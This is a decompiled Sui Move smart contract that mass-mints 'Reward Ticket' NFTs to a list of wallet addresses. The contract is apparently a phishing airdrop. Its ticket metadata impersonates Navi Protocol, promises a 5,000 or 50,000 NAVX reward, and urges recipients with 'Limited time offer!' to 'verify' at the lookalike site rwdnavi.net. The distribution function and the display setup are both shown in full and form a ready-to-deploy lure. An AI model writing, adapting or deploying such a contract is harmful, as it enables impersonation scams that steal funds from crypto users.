module 0x4f2e8721844c40f5fc2ca8d5e30b7c0dd8b8bd3756bf016b231c8da28a279284::reward9786 {
    struct REWARD9786 has drop {
        dummy_field: bool,
    }

    struct TICKET_9786 has store, key {
        id: 0x2::object::UID,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    struct MintEvent has copy, drop {
        nft_id: 0x2::object::ID,
        user: address,
        name: 0x1::string::String,
        image_url: 0x1::string::String,
        description: 0x1::string::String,
        Reward: 0x1::string::String,
    }

    public fun DistributeReward9786(arg0: &mut vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(arg0) > 0) {
            let v0 = TICKET_9786{
                id          : 0x2::object::new(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729352026/rwdnavinet_1019_4_zyqr3c.jpg"),
                description : 0x1::string::utf8(b"Claim your NAVX Reward from Navi Protocol! Visit https://rwdnavi.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 NAVX"),
            };
            let v1 = MintEvent{
                nft_id      : 0x2::object::id<TICKET_9786>(&v0),
                user        : 0x2::tx_context::sender(arg1),
                name        : 0x1::string::utf8(b"Reward Ticket"),
                image_url   : 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729352026/rwdnavinet_1019_4_zyqr3c.jpg"),
                description : 0x1::string::utf8(b"Claim your NAVX Reward from Navi Protocol! Visit https://rwdnavi.net to verify and receive your reward. Limited time offer!"),
                Reward      : 0x1::string::utf8(b"5,000 NAVX"),
            };
            0x2::event::emit<MintEvent>(v1);
            0x2::transfer::public_transfer<TICKET_9786>(v0, 0x1::vector::pop_back<address>(arg0));
        };
    }

    fun init(arg0: REWARD9786, arg1: &mut 0x2::tx_context::TxContext) {
        let v0 = 0x1::vector::empty<0x1::string::String>();
        let v1 = &mut v0;
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"name"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"image_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"description"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"project_url"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"creator"));
        0x1::vector::push_back<0x1::string::String>(v1, 0x1::string::utf8(b"Reward"));
        let v2 = 0x1::vector::empty<0x1::string::String>();
        let v3 = &mut v2;
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Reward Ticket"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://res.cloudinary.com/dkhar3xjm/image/upload/v1729352026/rwdnavinet_1019_4_zyqr3c.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Claim your NAVX Reward from Navi Protocol! Visit https://rwdnavi.net to verify and receive your reward. Limited time offer!"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://rwdnavi.net"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"Navi Protocol"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"50,000 NAVX"));
        let v4 = 0x2::package::claim<REWARD9786>(arg0, arg1);
        let v5 = 0x2::display::new_with_fields<TICKET_9786>(&v4, v0, v2, arg1);
        0x2::display::update_version<TICKET_9786>(&mut v5);
        0x2::transfer::public_transfer<0x2::package::Publisher>(v4, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::display::Display<TICKET_9786>>(v5, 0x2::tx_context::sender(arg1));
    }

    // decompiled from Move bytecode v6
}

